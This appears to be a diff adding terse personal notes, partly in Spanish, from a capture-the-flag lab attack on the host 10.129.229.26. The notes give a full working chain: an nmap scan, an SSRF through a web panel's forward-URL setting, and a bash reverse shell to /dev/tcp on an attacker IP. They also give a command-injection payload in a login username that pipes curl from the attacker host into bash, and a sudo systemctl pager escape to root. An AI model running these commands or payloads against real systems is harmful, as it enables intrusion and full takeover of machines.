@@ -1,0 +1,44 @@
+10.129.229.26
+[
+	[
+		nmap::: sin --open para ver puertos filtrados
+			
+			80/tcp    filtered  http
+			8338/tcp  filtered  unknown
+
+		firefox:::
+			::  http://10.129.229.26:55555/web/test
+				:: Configuration Settings(webPanel) -> Forward URL -> 127.0.0.1:80 -> check allOptions -> Apply
+
+			:: reload http://10.129.229.26:55555/test/
+
+		{
+		vim index.html:::
+			
+					#!/bin/bash
+					bash -i >& /dev/tcp/10.10.14.104/1234 0>&1
+
+		python3:::		python3 -m http.server 80 
+
+		Curl::: curl http://10.129.229.26:55555/test/login --data-urlencode 'username=;`curl 10.10.14.104 | bash`'
+		}
+
+
+		<( *** *** ***
+			::: sudo -l
+				/usr/bin/systemctl status trail.service
+
+			::: sudo /usr/bin/systemctl status trail.service
+
+				:: !/bin/bash
+				:: !/bin/sh
+
+				:: whoami
+					
+								root... <3 <3 <3
+
+		)>
+
+
+	]
+]
